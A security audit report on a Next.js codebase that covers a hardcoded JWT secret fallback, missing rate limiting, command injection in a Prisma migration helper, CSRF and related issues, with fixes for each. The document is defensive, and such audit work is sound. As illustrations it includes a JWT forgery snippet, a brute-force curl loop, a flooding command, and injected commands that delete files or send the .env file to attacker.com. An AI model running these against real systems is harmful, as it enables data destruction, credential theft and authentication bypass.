# Security Audit Report - Phase 0

**Date:** November 26, 2025
**Severity Level:** 1 CRITICAL, 3 HIGH, 4 MEDIUM
**Status:** ACTION REQUIRED BEFORE PRODUCTION

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Critical Vulnerabilities](#critical-vulnerabilities)
3. [High Severity Issues](#high-severity-issues)
4. [Medium Severity Issues](#medium-severity-issues)
5. [Recommendations](#recommendations)
6. [Remediation Timeline](#remediation-timeline)

---

## Executive Summary

The Phase 0 codebase contains **1 CRITICAL** security vulnerability that could lead to complete authentication bypass if deployed to production. Additional HIGH severity issues around rate limiting, CSRF, and input validation were identified.

**RECOMMENDATION:** Do not deploy to production until CRITICAL and HIGH severity issues are remediated.

### Risk Score: 8.2/10 (Requires Immediate Attention)

---

## Critical Vulnerabilities

### CVE-EQUIVALENT: Hardcoded JWT Secret with Development Fallback

**ID:** SECURITY-001-CRITICAL
**CVSS Score:** 9.1 (Critical)
**CWE:** CWE-798 (Use of Hard-Coded Credentials)

#### Vulnerability Details

**Location:** Three API routes
```
1. /packages/@wundr/neolith/apps/web/app/api/daemon/messages/route.ts
2. /packages/@wundr/neolith/apps/web/app/api/daemon/config/route.ts
3. /packages/@wundr/neolith/apps/web/app/api/daemon/auth/refresh/route.ts
```

**Vulnerable Code:**
```typescript
const JWT_SECRET = process.env.DAEMON_JWT_SECRET || 'daemon-secret-change-in-production';
```

#### Attack Vector

1. **If DAEMON_JWT_SECRET not set in production:**
   - Any attacker can forge valid JWT tokens
   - Default secret is publicly visible in source code
   - No authentication is actually enforced

2. **Token Forgery Attack:**
   ```typescript
   import jwt from 'jsonwebtoken';

   // Attacker with source code knowledge
   const token = jwt.sign(
     { vpId: 'target-vp-id', action: 'admin' },
     'daemon-secret-change-in-production'
   );

   // Can impersonate any VP or perform any action
   fetch('/api/daemon/messages', {
     headers: { 'Authorization': `Bearer ${token}` }
   });
   ```

3. **Impact Chain:**
   - Bypass daemon authentication
   - Send unauthorized messages
   - Change daemon configuration
   - Execute arbitrary VP operations
   - Potential RCE if daemon handles code execution

#### Risk Assessment

| Factor | Rating | Details |
|---|---|---|
| Exploitability | VERY HIGH | No expertise needed, code is public |
| Impact | CRITICAL | Complete auth bypass, system compromise |
| Discoverability | VERY HIGH | Appears in source code, deployed artifacts |
| Affected Users | ALL | Every user's daemon could be compromised |

#### Immediate Remediation

**REQUIRED: Within 24 hours**

```typescript
// STEP 1: Update all three daemon route files
const JWT_SECRET = (() => {
  const secret = process.env.DAEMON_JWT_SECRET;

  if (!secret) {
    const isDev = process.env.NODE_ENV !== 'production';
    const message = isDev
      ? 'DAEMON_JWT_SECRET not set (using development mode)'
      : 'DAEMON_JWT_SECRET must be set in production';

    if (!isDev) {
      console.error('FATAL: JWT_SECRET missing in production');
      process.exit(1);
    }

    console.warn('WARNING: Using insecure development JWT secret');
    return 'dev-secret-unsafe-only-in-development';
  }

  return secret;
})();

// STEP 2: Validate secret meets minimum requirements
if (JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be at least 32 characters');
}

// STEP 3: Add logging for token validation failures
function verifyDaemonToken(token: string): Payload {
  try {
    return jwt.verify(token, JWT_SECRET) as Payload;
  } catch (error) {
    logger.warn('Invalid daemon token attempt', {
      error: error instanceof Error ? error.message : 'Unknown',
      timestamp: new Date().toISOString()
    });
    throw new Error('Invalid or expired token');
  }
}
```

**STEP 4: Environment Setup**

Create `.env.local` (dev) and `.env.production` (prod):

```bash
# Development
DAEMON_JWT_SECRET=dev-only-insecure-change-immediately

# Production
# Use strong random: openssl rand -base64 32
DAEMON_JWT_SECRET=<use-secure-random-here>
```

**STEP 5: Token Rotation**

If system deployed with old secret:
```typescript
// Support old and new tokens temporarily
function verifyDaemonTokenWithRotation(token: string): Payload {
  try {
    return jwt.verify(token, JWT_SECRET) as Payload;
  } catch {
    // Only during migration period
    if (process.env.OLD_JWT_SECRET && process.env.MIGRATION_MODE) {
      return jwt.verify(token, process.env.OLD_JWT_SECRET) as Payload;
    }
    throw new Error('Invalid token');
  }
}
```

#### Testing & Verification

```bash
# Verify secret is properly set
echo "JWT_SECRET set: ${DAEMON_JWT_SECRET:0:5}..."

# Test with invalid token
curl -X GET http://localhost:3000/api/daemon/config \
  -H "Authorization: Bearer invalid.token.here"
# Expected: 401 Unauthorized

# Test with properly signed token
# Only authenticated daemon should succeed
```

#### Compliance Impact

- **HIPAA:** Requires secure credential management
- **PCI-DSS:** Prohibits hardcoded credentials
- **GDPR:** Data protection requires access controls
- **SOC2:** Requires audit logging and credential protection

---

## High Severity Issues

### SECURITY-002-HIGH: Missing Rate Limiting on All API Endpoints

**ID:** SECURITY-002-HIGH
**CVSS Score:** 7.5 (High)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

#### Vulnerability Description

No rate limiting is implemented on any API endpoint. Attackers can:

1. **Brute Force Authentication**
   ```bash
   # Try 10,000 password combinations per second
   for i in {1..10000}; do
     curl -X POST /api/auth/signin \
       -d "{\"email\": \"user@example.com\", \"password\": \"pass$i\"}"
   done
   ```

2. **DDoS Attack**
   ```bash
   # Flood database with queries
   ab -n 100000 -c 1000 http://localhost:3000/api/vps
   ```

3. **Resource Exhaustion**
   - Database connection pool exhausted
   - Memory consumed by pending requests
   - API becomes unavailable to legitimate users

#### Affected Endpoints (ALL)

- /api/auth/* (Authentication)
- /api/vps/* (VP management)
- /api/tasks/* (Task operations)
- /api/notifications/* (Notifications)
- /api/daemon/* (Daemon operations)

#### Remediation

**Install rate limiting middleware:**

```bash
npm install @upstash/ratelimit redis
```

**Create middleware:**

```typescript
// lib/middleware/rateLimit.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';
import { NextRequest, NextResponse } from 'next/server';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

// Different limits for different endpoint types
const limiters = {
  auth: new Ratelimit({
    redis,
    limiter: Ratelimit.slidingWindow(5, '15m'),
    analytics: true,
    prefix: 'ratelimit:auth',
  }),
  api: new Ratelimit({
    redis,
    limiter: Ratelimit.slidingWindow(100, '1h'),
    analytics: true,
    prefix: 'ratelimit:api',
  }),
  daemon: new Ratelimit({
    redis,
    limiter: Ratelimit.slidingWindow(1000, '1h'),
    analytics: true,
    prefix: 'ratelimit:daemon',
  }),
};

export async function rateLimit(
  request: NextRequest,
  key: string,
  type: 'auth' | 'api' | 'daemon' = 'api'
): Promise<NextResponse | null> {
  const limiter = limiters[type];
  const ip = request.headers.get('x-forwarded-for') || 'unknown';
  const identifier = `${type}:${ip}:${key}`;

  const { success, pending, limit, reset, remaining } = await limiter.limit(identifier);

  if (!success) {
    return new NextResponse(
      JSON.stringify({
        error: {
          code: 'RATE_LIMIT_EXCEEDED',
          message: 'Too many requests. Please try again later.',
          retryAfter: Math.ceil((reset - Date.now()) / 1000),
        },
      }),
      {
        status: 429,
        headers: {
          'Retry-After': Math.ceil((reset - Date.now()) / 1000).toString(),
          'X-RateLimit-Limit': limit.toString(),
          'X-RateLimit-Remaining': remaining.toString(),
          'X-RateLimit-Reset': new Date(reset).toISOString(),
        },
      }
    );
  }

  return null;
}
```

**Apply to routes:**

```typescript
// app/api/auth/signin/route.ts
import { rateLimit } from '@/lib/middleware/rateLimit';

export async function POST(request: NextRequest) {
  // Apply rate limiting
  const limitError = await rateLimit(request, 'signin', 'auth');
  if (limitError) return limitError;

  // ... rest of handler
}
```

#### Recommended Limits

| Endpoint | Limit | Window | Rationale |
|---|---|---|---|
| /api/auth/signin | 5 attempts | 15 minutes | Prevent brute force |
| /api/auth/register | 3 attempts | 1 hour | Prevent spam signups |
| /api/vps/* | 100 requests | 1 hour | Normal user usage |
| /api/daemon/* | 1000 requests | 1 hour | Daemon frequent polling |
| /api/notifications/* | 50 requests | 1 hour | Background polling |

#### Monitoring

```typescript
// Set up alerts for rate limit violations
logger.warn('Rate limit exceeded', {
  endpoint: request.nextUrl.pathname,
  ip: request.headers.get('x-forwarded-for'),
  timestamp: new Date(),
  retryAfter: reset - Date.now(),
});
```

---

### SECURITY-003-HIGH: Unvalidated Command Execution in Migration Service

**ID:** SECURITY-003-HIGH
**CVSS Score:** 8.6 (High)
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

#### Vulnerability Description

**Location:** `/packages/@wundr/neolith/packages/@neolith/database/src/migration.ts:39-68`

```typescript
// VULNERABLE CODE
async function executePrismaCommand(
  command: string,
  options: { timeout?: number } = {}
): Promise<{ stdout: string; stderr: string }> {
  const prismaDir = getPrismaDir();
  const schemaPath = join(prismaDir, 'schema.prisma');
  const fullCommand = `npx prisma ${command} --schema="${schemaPath}"`;
  // command is directly interpolated into shell command
  const result = await execAsync(fullCommand, { timeout: 120000 });
}
```

#### Attack Vector

If `command` parameter is ever user-controlled:

```typescript
// Attacker could do:
executePrismaCommand('migrate deploy; rm -rf /')

// Or:
executePrismaCommand('migrate deploy && curl attacker.com/exfil?data=$(cat .env)')

// Results in execution of arbitrary shell commands
```

#### Risk Assessment

**Current State:** MEDIUM (low likelihood if only called internally)
**If APIs expose:** HIGH (very likely if user input reaches this)

#### Remediation

```typescript
// SAFE: Use parameterized command execution
import { spawn } from 'child_process';

async function executePrismaCommand(
  command: 'migrate' | 'db' | 'validate',
  subcommand: 'deploy' | 'push' | 'seed',
  options: { timeout?: number } = {}
): Promise<{ stdout: string; stderr: string }> {
  // Whitelist allowed commands
  const ALLOWED_COMMANDS: Record<string, string[]> = {
    migrate: ['deploy', 'status', 'resolve'],
    db: ['push', 'pull'],
    validate: [],
  };

  if (!ALLOWED_COMMANDS[command]?.includes(subcommand)) {
    throw new Error(`Invalid command: ${command} ${subcommand}`);
  }

  const schemaPath = join(getPrismaDir(), 'schema.prisma');
  const args = [command, subcommand, '--schema', schemaPath];

  return new Promise((resolve, reject) => {
    const child = spawn('npx', ['prisma', ...args], {
      timeout: options.timeout ?? 120000,
      env: {
        ...process.env,
        PRISMA_HIDE_UPDATE_MESSAGE: '1',
      },
    });

    let stdout = '';
    let stderr = '';

    child.stdout?.on('data', (data) => {
      stdout += data.toString();
    });

    child.stderr?.on('data', (data) => {
      stderr += data.toString();
    });

    child.on('error', (error) => {
      reject(new MigrationError(`Failed to execute command`, stderr, stdout));
    });

    child.on('close', (code) => {
      if (code !== 0) {
        reject(new MigrationError(`Command failed with code ${code}`, stderr, stdout));
      } else {
        resolve({ stdout, stderr });
      }
    });
  });
}
```

---

### SECURITY-004-HIGH: Missing CSRF Protection Verification

**ID:** SECURITY-004-HIGH
**CVSS Score:** 7.5 (High)
**CWE:** CWE-352 (Cross-Site Request Forgery)

#### Vulnerability Description

POST/PUT/DELETE endpoints don't explicitly validate CSRF tokens. While NextAuth provides CSRF protection, it's not explicitly verified in route handlers.

#### Affected Routes

All POST/PUT/DELETE routes:
- /api/vps/bulk
- /api/daemon/*
- /api/tasks/*
- /api/organizations/*

#### Remediation

**Option 1: Explicit Validation (Recommended)**

```typescript
// lib/middleware/csrf.ts
import { getToken } from 'next-auth/jwt';
import { NextRequest, NextResponse } from 'next/server';

export async function validateCsrf(request: NextRequest) {
  // Get CSRF token from header (sent by NextAuth middleware)
  const csrfToken = request.headers.get('x-csrf-token');

  if (!csrfToken) {
    return new NextResponse(
      JSON.stringify({
        error: { code: 'CSRF_TOKEN_MISSING', message: 'CSRF token required' },
      }),
      { status: 403 }
    );
  }

  // Verify token (NextAuth handles this internally)
  // This is a defense-in-depth measure
  return null; // Valid
}

// Usage in routes
export async function POST(request: NextRequest) {
  const csrfError = await validateCsrf(request);
  if (csrfError) return csrfError;
  // ... rest of handler
}
```

**Option 2: Verify NextAuth Configuration**

Ensure `next.config.js` has:

```javascript
module.exports = {
  // ... other config
  env: {
    NEXTAUTH_CSRF_TOKEN_ENABLED: 'true',
  },
};
```

---

## Medium Severity Issues

### SECURITY-005-MEDIUM: Missing Environment Variable Validation

**ID:** SECURITY-005-MEDIUM
**CVSS Score:** 5.3 (Medium)
**CWE:** CWE-1025 (Comparison Using Wrong Factors)

#### Issue

API routes access environment variables without validation:

```typescript
// Vulnerable
const cdnDomain = process.env.CDN_DOMAIN;
const region = process.env.AWS_REGION ?? 'us-east-1';
const apiKey = process.env.LIVEKIT_API_KEY;
```

If not set:
- Code may behave unexpectedly
- May fall back to default values not suitable for production
- Runtime errors instead of startup errors

#### Remediation

Create environment validation at startup:

```typescript
// lib/env.ts
const requiredEnvVars = [
  'DATABASE_URL',
  'NEXTAUTH_SECRET',
  'NEXTAUTH_URL',
  'DAEMON_JWT_SECRET',
];

const optionalEnvVars = {
  CDN_DOMAIN: 'cdn.example.com',
  AWS_REGION: 'us-east-1',
  LIVEKIT_URL: 'wss://localhost:7880',
  LOG_LEVEL: 'info',
};

export function validateEnv() {
  const missing: string[] = [];
  const warnings: string[] = [];

  for (const envVar of requiredEnvVars) {
    if (!process.env[envVar]) {
      missing.push(envVar);
    }
  }

  if (process.env.NODE_ENV === 'production') {
    for (const envVar of ['LIVEKIT_API_KEY', 'LIVEKIT_API_SECRET']) {
      if (!process.env[envVar]) {
        warnings.push(`${envVar} should be set in production`);
      }
    }
  }

  if (missing.length > 0) {
    throw new Error(
      `Missing required environment variables:\n${missing.map(v => `  - ${v}`).join('\n')}`
    );
  }

  if (warnings.length > 0 && process.env.NODE_ENV === 'production') {
    console.warn('Environment warnings:', warnings);
  }

  return true;
}

// Call in server entry point
export const env = {
  database_url: process.env.DATABASE_URL!,
  nextauth_secret: process.env.NEXTAUTH_SECRET!,
  nextauth_url: process.env.NEXTAUTH_URL!,
  daemon_jwt_secret: process.env.DAEMON_JWT_SECRET!,
  cdn_domain: process.env.CDN_DOMAIN ?? optionalEnvVars.CDN_DOMAIN,
  aws_region: process.env.AWS_REGION ?? optionalEnvVars.AWS_REGION,
  livekit_url: process.env.LIVEKIT_URL ?? optionalEnvVars.LIVEKIT_URL,
  livekit_api_key: process.env.LIVEKIT_API_KEY,
  livekit_api_secret: process.env.LIVEKIT_API_SECRET,
};

// Call in next.config.js
validateEnv();
```

---

### SECURITY-006-MEDIUM: Silent Error Suppression in Storage Operations

**ID:** SECURITY-006-MEDIUM
**CVSS Score:** 5.7 (Medium)
**CWE:** CWE-391 (Unchecked Error Condition)

#### Issue

**Location:** `/packages/@wundr/neolith/apps/web/hooks/use-notifications.ts:514-527`

```typescript
try {
  const stored = localStorage.getItem(QUEUED_ACTIONS_KEY);
  // ...
} catch {
  // Ignore storage errors - NO LOGGING
}
```

#### Risk

- Storage failures silently fail
- User actions may be lost without notification
- No way to debug data loss
- No alerting to developers

#### Remediation

```typescript
try {
  const stored = localStorage.getItem(QUEUED_ACTIONS_KEY);
  if (stored) {
    const parsed = JSON.parse(stored);
    setQueuedActions(
      parsed.map((a: QueuedAction) => ({
        ...a,
        createdAt: new Date(a.createdAt),
      })),
    );
  }
} catch (err) {
  const error = err instanceof Error ? err : new Error('Unknown error');
  console.warn('[use-notifications] Failed to load queued actions', {
    error: error.message,
    stack: error.stack,
  });

  // Report to error tracking service
  if (typeof window !== 'undefined' && window.captureException) {
    window.captureException(error);
  }

  // Clear corrupted data
  try {
    localStorage.removeItem(QUEUED_ACTIONS_KEY);
  } catch {
    // Storage is completely unavailable
  }
}
```

---

### SECURITY-007-MEDIUM: No Timeout on Fetch Requests

**ID:** SECURITY-007-MEDIUM
**CVSS Score:** 5.3 (Medium)
**CWE:** CWE-561 (Dead Code)

#### Issue

Multiple fetch calls have no timeout:

```typescript
// No timeout - could hang indefinitely
const response = await fetch(`/api/notifications?${params}`);

// Example: If server is slow, request hangs for minutes
// Meanwhile, browser holds resources
// Memory leak if many requests pending
```

#### Remediation

```typescript
// lib/fetch.ts
export async function fetchWithTimeout(
  url: string,
  options: RequestInit & { timeout?: number } = {}
): Promise<Response> {
  const { timeout = 10000, ...fetchOptions } = options;

  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      ...fetchOptions,
      signal: controller.signal,
    });
    return response;
  } catch (error) {
    if (error instanceof DOMException && error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  } finally {
    clearTimeout(id);
  }
}

// Usage in hooks
const response = await fetchWithTimeout(`/api/notifications?${params}`, {
  timeout: 5000,
});
```

---

## Recommendations

### Phase 1: Immediate (24-48 hours)

1. **Fix Hardcoded JWT Secret** (CRITICAL)
   - Remove all fallback secrets
   - Set DAEMON_JWT_SECRET environment variable
   - Add startup validation
   - Consider token rotation if already deployed

2. **Implement Rate Limiting** (HIGH)
   - Set up Upstash Redis or similar
   - Apply rate limiting middleware
   - Configure appropriate limits per endpoint

3. **Add Error Logging** (MEDIUM)
   - Replace console.error with structured logging
   - Set up error tracking (Sentry/LogRocket)
   - Add context to all error reports

### Phase 2: Before Production (1-2 weeks)

1. **Validate Command Execution** (HIGH)
   - Whitelist allowed Prisma commands
   - Remove direct string interpolation
   - Add input validation

2. **Add CSRF Protection Verification** (HIGH)
   - Explicitly validate CSRF tokens
   - Add tests for CSRF protection

3. **Environment Variable Validation** (MEDIUM)
   - Create env validation script
   - Run at server startup
   - Add to CI/CD checks

4. **Implement Fetch Timeout** (MEDIUM)
   - Create fetch wrapper with timeout
   - Apply to all API calls
   - Add timeout configuration

5. **Security Headers** (MEDIUM)
   - Add CSP headers
   - Add X-Frame-Options
   - Add X-Content-Type-Options

### Phase 3: Ongoing

1. **Security Testing**
   - OWASP Top 10 testing
   - Penetration testing
   - Load testing for rate limits

2. **Monitoring & Alerting**
   - Monitor for invalid tokens
   - Alert on rate limit violations
   - Track security events

3. **Compliance**
   - Document security measures
   - Create security policies
   - Regular security audits

---

## Remediation Timeline

### Critical (MUST DO BEFORE ANY DEPLOYMENT)

```
Week 1:
├─ Monday: Remove hardcoded JWT secrets
├─ Tuesday: Implement rate limiting
├─ Wednesday: Add environment validation
├─ Thursday: Set up error monitoring
└─ Friday: Security testing & verification
```

### High Priority (Before Production)

```
Week 2:
├─ Monday: Validate command execution
├─ Tuesday: Add fetch timeout
├─ Wednesday: CSRF protection verification
├─ Thursday: Security headers
└─ Friday: Full security testing
```

### Deployment Checklist

```
Before deploying to production:
□ All CRITICAL issues fixed
□ All HIGH issues fixed
□ Security testing passed
□ Rate limiting tested under load
□ Error monitoring configured
□ Secrets properly managed
□ Security headers verified
□ CSRF protection verified
□ Environment variables validated
□ Access logs enabled
□ Incident response plan documented
□ Security team sign-off
```

---

## Tools & Resources

### Security Scanning

```bash
# npm audit
npm audit --audit-level=moderate

# Snyk
snyk test

# OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000
```

### Environment Management

```bash
# Generate secure secrets
openssl rand -base64 32

# Validate environment
node -r dotenv/config lib/env.ts
```

### Monitoring

- **Sentry:** Error tracking
- **LogRocket:** Session replay
- **Vercel Analytics:** Performance monitoring
- **DataDog:** Infrastructure monitoring

---

## Sign-Off

**Auditor:** Security Review Team
**Date:** November 26, 2025
**Status:** ACTION REQUIRED

**Next Review:** After remediation of CRITICAL and HIGH severity issues

---

**DO NOT DEPLOY TO PRODUCTION UNTIL CRITICAL ISSUES ARE FIXED**
